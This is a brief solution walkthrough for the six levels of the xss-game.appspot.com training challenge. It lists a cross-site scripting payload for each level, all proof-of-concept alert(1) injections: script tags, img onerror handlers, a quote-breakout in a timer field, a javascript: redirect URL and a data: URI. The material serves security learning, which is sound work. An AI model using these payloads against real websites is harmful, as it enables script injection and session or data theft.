----------------https://xss-game.appspot.com/-------------------------------

Level 1: Hello , world of XSS

In search bar write:
"><script>alert(1)</script>

Level 2: Persistence is key

In box write:
"><img src=x onerror=alert(1)

Level 3: That sinking feeling...

In URL just add payload '><img src=x onerror=alert(1)
Your URL look like : https://xss-game.appspot.com/level3/frame#1 '><img src=x onerror=alert(1)>

Level 4: Context matters

In text field remove 3 and write: timer=');alert('1 and then hit GO

Level 5: Breaking protocol

1) Click SignUp
2) Make your URL like this : https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)
3) Click next

Level 6: Follow the rabbit

Make your URL like this: https://xss-game.appspot.com/level6/frame#data:"",alert(1)
